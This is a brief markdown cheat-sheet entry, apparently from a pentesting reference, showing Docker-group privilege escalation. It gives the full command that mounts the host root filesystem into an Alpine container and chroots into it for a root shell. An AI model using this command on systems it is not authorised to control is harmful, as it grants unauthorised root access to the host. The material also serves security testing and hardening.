---
title: Docker
desc: A set of platform as a service products that use OS-level virtualization to deliver software in packages called containers.
tags: [Docker, Linux, PrivEsc]
alts: [ContainerEscape]
website: 
render_with_liquid: false
---

## Root Privilege Escalation

```sh
# Check if current user belongs to "docker" group.
groups

# If the user belongs to "docker" group, you can get a root shell.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```